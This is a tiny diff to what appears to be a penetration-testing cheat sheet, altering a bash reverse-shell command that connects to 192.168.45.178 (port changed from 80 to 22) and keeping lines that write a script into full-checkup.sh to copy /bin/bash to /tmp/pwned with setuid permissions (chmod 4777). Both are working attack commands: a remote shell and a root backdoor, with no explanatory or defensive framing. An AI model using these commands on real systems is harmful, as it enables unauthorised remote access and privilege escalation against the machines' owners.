@@ -2,7 +2,7 @@
 
 #### BASH
 ```bash
-bash -i >& /dev/tcp/192.168.45.178/80 0>&1
+bash -i >& /dev/tcp/192.168.45.178/22 0>&1
 
 echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/pwned\nchmod 4777 /tmp/pwned' >> full-checkup.sh
 chmod +x full-checkup.sh
